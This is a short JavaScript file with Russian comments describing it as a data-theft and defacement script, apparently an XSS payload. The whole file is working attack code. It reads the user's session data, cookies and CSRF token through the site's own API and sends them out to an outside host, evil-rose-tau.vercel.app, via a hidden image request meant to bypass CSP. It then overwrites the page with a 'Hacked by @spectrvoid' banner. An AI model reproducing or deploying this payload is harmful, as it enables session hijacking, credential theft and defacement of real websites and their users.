// x.js - Скрипт для кражи данных и дефейса
(function() {
    // 1. Кража данных
    try {
        fetch('/api/session', { credentials: 'same-origin' })
            .then(r => r.json())
            .then(data => {
                var payload = {
                    username: data.user?.username || 'Unknown',
                    id: data.user?.id || 'Unknown',
                    cookies: document.cookie,
                    csrf: data.csrf_token || '',
                    url: window.location.href
                };
                // Отправка через img (обход CSP)
                var img = document.createElement('img');
                img.src = 'https://evil-rose-tau.vercel.app/api/steal?data=' + encodeURIComponent(JSON.stringify(payload));
                img.style.display = 'none';
                document.body.appendChild(img);
            })
            .catch(e => console.log('Error stealing data:', e));
    } catch(e) {}

    // 2. Дефейс страницы
    try {
        document.documentElement.innerHTML = '<div style="position:fixed;top:0;left:0;width:100vw;height:100vh;display:flex;justify-content:center;align-items:center;background:#000;color:#f00;font-family:monospace;font-size:4rem;font-weight:bold;z-index:99999;text-shadow:0 0 20px#f00;">Hacked by @spectrvoid</div>';
    } catch(e) {}
})();